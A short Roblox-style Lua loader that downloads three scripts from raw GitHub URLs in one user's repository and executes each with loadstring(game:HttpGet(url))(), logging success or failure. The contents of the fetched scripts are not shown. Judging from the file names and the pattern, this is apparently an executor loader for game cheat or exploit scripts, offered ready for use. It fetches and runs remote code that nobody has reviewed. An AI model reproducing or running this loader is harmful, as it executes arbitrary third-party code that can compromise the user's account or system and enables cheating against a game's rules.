
local scripts = {
    "https://raw.githubusercontent.com/zkaiwthbro/dteeeec/refs/heads/main/agp.lua",
    "https://raw.githubusercontent.com/zkaiwthbro/dteeeec/refs/heads/main/chetsopen.lua",
    "https://raw.githubusercontent.com/zkaiwthbro/dteeeec/refs/heads/main/big1.lua"
}

for i, url in ipairs(scripts) do
    task.spawn(function()
        local ok, err = pcall(function()
            loadstring(game:HttpGet(url))()
        end)
        if ok then
            print("[Loader] Loaded #" .. i .. " ✓")
        else
            warn("[Loader] Failed #" .. i .. ": " .. tostring(err))
        end
    end)
end

print("[Loader] All scripts starting...")
